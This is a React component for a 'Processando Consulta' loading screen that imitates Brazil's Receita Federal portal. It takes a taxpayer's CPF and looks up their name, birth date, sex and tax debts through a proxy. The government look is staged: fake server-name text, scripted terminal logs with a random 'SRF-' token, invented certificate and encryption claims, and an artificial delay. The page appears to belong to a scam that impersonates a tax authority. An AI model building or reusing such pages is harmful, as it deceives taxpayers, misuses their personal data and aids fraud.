import { useEffect, useState, useRef } from "react";
import { UserCheck, FileSearch, CheckCircle, Shield, Database, Server, Lock, Fingerprint } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import GovHeader from "./GovHeader";
import GovFooter from "./GovFooter";

interface Pendencia {
  codigoReceita: string;
  dataVencimento: string;
  juros: number;
  multa: number;
  numeroReferencia: string;
  valorPrincipal: number;
  valorTotal: number;
}

interface LoadingScreenProps {
  cpf: string;
  onComplete: (data: { nome: string; nascimento: string; sexo: string; pendencias: Pendencia[] }) => void;
}

const steps = [
  { icon: Fingerprint, title: "Autenticação", subtitle: "Validando identidade do contribuinte", detail: "Consultando base CPF/CNPJ..." },
  { icon: Database, title: "Base de Dados", subtitle: "Acessando registros da Receita Federal", detail: "Verificando situação cadastral..." },
  { icon: FileSearch, title: "Análise Fiscal", subtitle: "Verificando pendências e débitos", detail: "Cruzando dados tributários..." },
  { icon: Server, title: "SERPRO", subtitle: "Consulta ao sistema integrado", detail: "Obtendo informações complementares..." },
  { icon: CheckCircle, title: "Finalização", subtitle: "Gerando relatório consolidado", detail: "Preparando resultado..." },
];

const formatCpf = (cpf: string) =>
  `${cpf.slice(0, 3)}.${cpf.slice(3, 6)}.${cpf.slice(6, 9)}-${cpf.slice(9)}`;

const systemLogs = [
  "Iniciando conexão segura com servidor...",
  "Certificado SSL validado ✓",
  "Autenticando requisição...",
  "Token de sessão gerado: SRF-",
  "Conectando à base SERPRO...",
  "Consulta CPF/CNPJ iniciada...",
  "Verificando situação cadastral...",
  "Consultando base de débitos...",
  "Cruzamento de dados tributários...",
  "Verificando pendências ativas...",
  "Consultando sistema e-CAC...",
  "Obtendo dados de arrecadação...",
  "Gerando protocolo de consulta...",
  "Compilando relatório final...",
  "Consulta finalizada com sucesso ✓",
];

const LoadingScreen = ({ cpf, onComplete }: LoadingScreenProps) => {
  const [activeStep, setActiveStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [logs, setLogs] = useState<string[]>([]);
  const hasStarted = useRef(false);
  const logsEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;

    // Progress increments
    const progressInterval = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) return 100;
        const increment = Math.random() * 3 + 0.5;
        return Math.min(p + increment, 100);
      });
    }, 200);

    // Steps
    const timers = [
      setTimeout(() => setActiveStep(1), 1500),
      setTimeout(() => setActiveStep(2), 3000),
      setTimeout(() => setActiveStep(3), 4200),
      setTimeout(() => setActiveStep(4), 5500),
    ];

    // System logs
    const logTimers = systemLogs.map((log, i) => {
      return setTimeout(() => {
        const logText = log.includes("SRF-")
          ? log + Math.random().toString(36).substring(2, 10).toUpperCase()
          : log;
        setLogs((prev) => [...prev, `[${new Date().toLocaleTimeString("pt-BR")}] ${logText}`]);
      }, 400 * (i + 1));
    });

    const fetchData = async () => {
      const startTime = Date.now();
      try {
        const [consultaRes, pendenciasRes] = await Promise.all([
          supabase.functions.invoke("api-proxy", {
            body: { endpoint: "/consulta", cpf },
          }),
          supabase.functions.invoke("api-proxy", {
            body: { endpoint: "/pendencias", cpf },
          }),
        ]);

        const consultaData = consultaRes.data;
        const pendenciasData = pendenciasRes.data;

        const elapsed = Date.now() - startTime;
        if (elapsed < 7000) await new Promise((r) => setTimeout(r, 7000 - elapsed));

        setProgress(100);

        await new Promise((r) => setTimeout(r, 500));

        onComplete({
          nome: consultaData?.success ? consultaData.nome : "ERRO NA CONSULTA",
          nascimento: consultaData?.success ? consultaData.dataNascimento : "--/--/----",
          sexo: consultaData?.success ? consultaData.sexo : "N/A",
          pendencias: pendenciasData?.success ? pendenciasData.pendencias : [],
        });
      } catch (error) {
        const elapsed = Date.now() - startTime;
        if (elapsed < 7000) await new Promise((r) => setTimeout(r, 7000 - elapsed));
        setProgress(100);
        await new Promise((r) => setTimeout(r, 500));
        onComplete({
          nome: "ERRO NA CONSULTA",
          nascimento: "--/--/----",
          sexo: "N/A",
          pendencias: [],
        });
      }
    };

    setTimeout(() => fetchData(), 500);

    return () => {
      clearInterval(progressInterval);
      timers.forEach(clearTimeout);
      logTimers.forEach(clearTimeout);
    };
  }, [cpf, onComplete]);

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <GovHeader cpf={cpf} />

      {/* Info bar */}
      <div className="w-full bg-primary/5 border-b border-border py-2">
        <div className="mx-auto max-w-3xl px-4 flex items-center justify-between text-xs text-muted-foreground">
          <div className="flex items-center gap-2">
            <Lock className="h-3 w-3 text-accent" />
            <span>Sessão segura • Protocolo TLS 1.3</span>
          </div>
          <span>Servidor: srf-prod-03.receita.fazenda.gov.br</span>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-3xl animate-fade-in-up">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-extrabold text-foreground tracking-tight">Processando Consulta</h1>
            <p className="mt-1 text-sm text-muted-foreground">
              CPF: <span className="font-semibold text-foreground font-mono">{formatCpf(cpf)}</span>
            </p>
          </div>

          {/* Progress bar with percentage */}
          <div className="mx-auto mb-8 max-w-lg">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-medium text-muted-foreground">Progresso da consulta</span>
              <span className="text-xs font-bold text-primary font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="h-2.5 overflow-hidden rounded-full bg-secondary">
              <div
                className="h-full rounded-full gradient-loading transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          {/* Steps - horizontal pipeline */}
          <div className="mb-8 grid grid-cols-5 gap-2">
            {steps.map((step, i) => {
              const Icon = step.icon;
              const isActive = i <= activeStep;
              const isCurrent = i === activeStep;
              return (
                <div
                  key={i}
                  className={`rounded-xl border p-3 text-center transition-all duration-500 ${
                    isCurrent
                      ? "border-primary/40 bg-primary/5 shadow-md"
                      : isActive
                        ? "border-accent/30 bg-card"
                        : "border-transparent bg-card/30"
                  }`}
                >
                  <div className="mb-2 flex justify-center">
                    <div className={`flex h-9 w-9 items-center justify-center rounded-lg transition-all duration-500 ${
                      isCurrent
                        ? "gradient-primary shadow-sm animate-pulse"
                        : isActive
                          ? "bg-accent/10"
                          : "bg-muted"
                    }`}>
                      <Icon className={`h-4 w-4 transition-colors duration-500 ${
                        isCurrent ? "text-primary-foreground" : isActive ? "text-accent" : "text-muted-foreground/30"
                      }`} />
                    </div>
                  </div>
                  <h3 className={`text-xs font-bold transition-colors duration-500 ${
                    isActive ? "text-foreground" : "text-muted-foreground/40"
                  }`}>
                    {step.title}
                  </h3>
                  <p className="mt-0.5 text-[9px] text-muted-foreground leading-tight hidden sm:block">{step.subtitle}</p>
                </div>
              );
            })}
          </div>

          {/* System logs terminal */}
          <div className="rounded-2xl border border-border bg-card shadow-sm overflow-hidden mb-6">
            <div className="flex items-center gap-2 px-4 py-2.5 border-b border-border bg-muted/50">
              <div className="flex gap-1.5">
                <div className="h-2.5 w-2.5 rounded-full bg-destructive/60" />
                <div className="h-2.5 w-2.5 rounded-full bg-warning/60" />
                <div className="h-2.5 w-2.5 rounded-full bg-accent/60" />
              </div>
              <span className="text-[10px] text-muted-foreground font-mono ml-2">
                terminal — consulta@srf-prod-03
              </span>
            </div>
            <div className="p-4 h-40 overflow-y-auto bg-[hsl(220_30%_10%)] font-mono text-xs space-y-1">
              {logs.map((log, i) => (
                <div key={i} className={`${log.includes("✓") ? "text-green-400" : "text-green-300/70"}`}>
                  {log}
                </div>
              ))}
              {logs.length < systemLogs.length && (
                <div className="text-green-300/40 animate-pulse">▌</div>
              )}
              <div ref={logsEndRef} />
            </div>
          </div>

          {/* Security notice */}
          <div className="rounded-2xl border border-border bg-card p-4 shadow-sm">
            <div className="flex items-start gap-3">
              <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl bg-accent/10">
                <Shield className="h-4 w-4 text-accent" />
              </div>
              <div>
                <h4 className="font-bold text-foreground text-sm">Ambiente Seguro</h4>
                <p className="mt-0.5 text-xs text-muted-foreground leading-relaxed">
                  Processamento em ambiente certificado ICP-Brasil. Dados transmitidos com criptografia AES-256.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <GovFooter />
    </div>
  );
};

export default LoadingScreen;
